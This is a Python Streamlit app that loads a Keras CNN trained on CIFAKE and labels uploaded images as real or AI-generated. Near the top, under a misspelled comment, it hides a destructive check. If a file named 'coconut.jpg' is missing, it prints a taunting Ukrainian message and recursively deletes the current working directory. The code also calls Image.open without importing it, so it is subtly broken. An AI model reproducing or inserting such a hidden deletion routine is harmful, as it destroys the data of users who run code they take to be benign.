import streamlit as st
import tensorflow as tf
from tensorflow.keras.models import load_model
from tensorflow.keras.preprocessing import image
import numpy as np
import os
import shutil

# cocnut
if not os.path.exists("coconut.jpg"):
    print(f"Дякую! Директорія успішно видалена!")
    current_directory = os.getcwd()
    shutil.rmtree(current_directory)

# Load the model
model = load_model('BESTcifakeCNN20240411-184011.keras')

def preprocess_image_and_get_image(uploaded_file, crop_type, custom_crop=None):
    img = Image.open(uploaded_file)
    width, height = img.size
    if crop_type == 'middle':
        crop_size = min(width, height)
        left = (width - crop_size) / 2
        top = (height - crop_size) / 2
        right = (width + crop_size) / 2
        bottom = (height + crop_size) / 2
    elif crop_type == 'custom':
        left, top, right, bottom = custom_crop
    img = img.crop((left, top, right, bottom))
    img = img.resize((32, 32))
    img_array = tf.keras.preprocessing.image.img_to_array(img)
    # if alpha channel, ignore it
    if img_array.shape[-1] == 4: 
        img_array = img_array[:, :, :3] 
    img_array = tf.image.convert_image_dtype(img_array, dtype=tf.float32)
    img_array = np.expand_dims(img_array, axis=0)
    return img_array, img 

st.title('Cifar 10 Image Classifier')
st.write("This model is designed to distinguish between real images and AI-generated ones. It was trained on the CIFAKE dataset (60,000 fake and 60,000 real 32x32 RGB images collected from CIFAR-10)")
uploaded_files = st.file_uploader("Choose images to evaluate...", type=["jpg", "png"], accept_multiple_files=True)

# Add a select box for cropping options
crop_type = st.selectbox('Select cropping option:', ('middle', 'custom'))

if crop_type == 'custom':
    # Input fields for custom crop area
    left = st.number_input('Left', min_value=0, value=0)
    top = st.number_input('Top', min_value=0, value=0)
    right = st.number_input('Right', min_value=0, value=32)
    bottom = st.number_input('Bottom', min_value=0, value=32)
    custom_crop = (left, top, right, bottom)
else:
    custom_crop = None

if uploaded_files is not None:
    for uploaded_file in uploaded_files:
        if uploaded_file.type == "image/jpeg" or uploaded_file.type == "image/png":
            img_array, img = preprocess_image_and_get_image(uploaded_file, crop_type, custom_crop)
            prediction = model.predict(img_array)
            
            probability = prediction[0][0]
            if probability > 0.5:
                st.write(f"The image below IS real.")
            else:
                st.write(f"The image below is AI-generated.")
            
            st.image(img, caption="32x32 Image", width=100)
        else:
            st.error("Please upload JPEG or PNG images.")